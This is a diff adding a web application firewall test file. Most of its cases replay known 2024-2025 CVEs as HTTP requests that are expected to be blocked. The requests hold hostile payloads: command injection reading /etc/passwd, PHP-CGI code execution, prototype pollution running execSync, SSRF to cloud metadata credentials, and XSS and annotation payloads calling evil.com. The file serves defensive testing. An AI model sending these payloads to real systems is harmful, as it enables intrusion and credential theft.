@@ -1,0 +1,225 @@
+meta:
+  category: "Known CVEs"
+  subcategory: "2024-2026 CVEs"
+  owasp: "A06:2021"
+  severity: "critical"
+
+tests:
+  # --- 2024 CVEs ---
+
+  - id: "cve-2024-001"
+    title: "CVE-2024-3094 — XZ Utils backdoor (SSH-related probe)"
+    tags: ["cve", "cve-2024-3094", "supply-chain", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/health"
+      headers:
+        User-Agent: "SSH-2.0-OpenSSH_9.7p1"
+        X-Forwarded-For: "127.0.0.1"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cve-2024-002"
+    title: "CVE-2024-21887 — Ivanti Connect Secure command injection"
+    tags: ["cve", "cve-2024-21887", "cmdi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"
+      query_string: "id=test&hostname=;cat+/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-003"
+    title: "CVE-2024-21762 — FortiOS out-of-bound write via crafted request"
+    tags: ["cve", "cve-2024-21762", "rce", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/remote/hostcheck_validate"
+      query_string: "clientos=Linux&ippatch=%0a%0d%0a%0dmalicious"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-004"
+    title: "CVE-2024-4577 — PHP CGI argument injection on Windows"
+    tags: ["cve", "cve-2024-4577", "cmdi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/cgi-bin/php-cgi.exe"
+      query_string: "-d+allow_url_include=1+-d+auto_prepend_file=php://input"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "<?php system('whoami'); ?>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-005"
+    title: "CVE-2024-6387 — regreSSHion OpenSSH (probe detection)"
+    tags: ["cve", "cve-2024-6387", "scanner", "paranoia-2"]
+    request:
+      method: "GET"
+      path: "/api/scan"
+      query_string: "target=127.0.0.1&port=22&check=CVE-2024-6387"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-006"
+    title: "CVE-2024-27198 — JetBrains TeamCity auth bypass"
+    tags: ["cve", "cve-2024-27198", "auth-bypass", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/app/rest/users;.jsp"
+      headers:
+        Accept: "application/json"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-007"
+    title: "CVE-2024-23897 — Jenkins CLI arbitrary file read"
+    tags: ["cve", "cve-2024-23897", "traversal", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/cli"
+      query_string: "remoting=false"
+      headers:
+        Content-Type: "application/octet-stream"
+      body: "@/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-008"
+    title: "CVE-2024-1709 — ConnectWise ScreenConnect auth bypass"
+    tags: ["cve", "cve-2024-1709", "auth-bypass", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/SetupWizard.aspx/../../../"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-009"
+    title: "CVE-2024-3400 — Palo Alto PAN-OS command injection"
+    tags: ["cve", "cve-2024-3400", "cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/ssl-vpn/hipreport.esp"
+      content_type: "application/x-www-form-urlencoded"
+      body: "user=a]%0a;cat+/etc/passwd%0a[&computer=test&domain=test"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2024-010"
+    title: "CVE-2024-0012 — PAN-OS management interface auth bypass"
+    tags: ["cve", "cve-2024-0012", "auth-bypass", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/php/utils/debug.php"
+      headers:
+        X-PAN-AUTHCHECK: "off"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- 2025 CVEs ---
+
+  - id: "cve-2025-001"
+    title: "CVE-2025-0282 — Ivanti Connect Secure stack buffer overflow"
+    tags: ["cve", "cve-2025-0282", "rce", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/dana-na/auth/url_default/welcome.cgi"
+      query_string: "p=access-denied%00"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-002"
+    title: "CVE-2025-24813 — Apache Tomcat partial PUT RCE"
+    tags: ["cve", "cve-2025-24813", "rce", "deserialization", "paranoia-1"]
+    request:
+      method: "PUT"
+      path: "/.session"
+      content_type: "application/x-java-serialized-object"
+      body: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-003"
+    title: "CVE-2025-1097 — Kubernetes Ingress-Nginx RCE via annotation"
+    tags: ["cve", "cve-2025-1097", "rce", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/v1/namespaces/default/ingresses"
+      content_type: "application/json"
+      body: '{"metadata":{"annotations":{"nginx.ingress.kubernetes.io/auth-url":"http://evil.com/shell#\" \\n}\\nssl_engine rdrand;\\n"}}}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-004"
+    title: "CVE-2025-29927 — Next.js middleware authorization bypass"
+    tags: ["cve", "cve-2025-29927", "auth-bypass", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/admin/dashboard"
+      headers:
+        x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-005"
+    title: "CVE-2025-30208 — Vite dev server arbitrary file read"
+    tags: ["cve", "cve-2025-30208", "traversal", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/@fs/etc/passwd?import&raw??"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- 2025-2026 emerging patterns ---
+
+  - id: "cve-2025-006"
+    title: "React2Shell-style padded RCE payload"
+    tags: ["cve", "rce", "padding", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/render"
+      content_type: "application/json"
+      body: '{"component":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","dangerouslySetInnerHTML":{"__html":"<img src=x onerror=fetch(atob(aHR0cDovL2V2aWwuY29tLw==))>"}}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-007"
+    title: "Server-Side Prototype Pollution to RCE"
+    tags: ["cve", "rce", "prototype-pollution", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/config"
+      content_type: "application/json"
+      body: '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-2025-008"
+    title: "SSRF via PDF generation library (WeasyPrint/wkhtmltopdf)"
+    tags: ["cve", "ssrf", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/generate-pdf"
+      content_type: "application/json"
+      body: '{"html":"<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"></iframe>"}'
+    expected:
+      status: 403
+      action: "block"
